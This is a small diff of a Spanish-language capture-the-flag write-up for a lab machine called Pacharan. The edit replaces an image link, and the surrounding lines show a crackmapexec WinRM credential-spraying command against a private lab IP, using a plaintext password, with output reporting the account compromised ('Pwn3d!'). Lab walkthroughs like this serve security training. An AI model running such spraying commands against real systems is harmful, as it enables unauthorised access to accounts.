@@ -84,7 +84,7 @@ lanzamos:
 
      crackmapexec winrm 192.168.1.148 -u user.txt -p TurkisArrusPuchuchuSiu1
 
-![[the hackers labs/avanzado/pacharan/test9.png]]
+![image](https://github.com/user-attachments/assets/88ee92a6-b636-4295-a1ad-be9f0f3b7e50)
 
 obtenemos: [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1 (Pwn3d!)
 
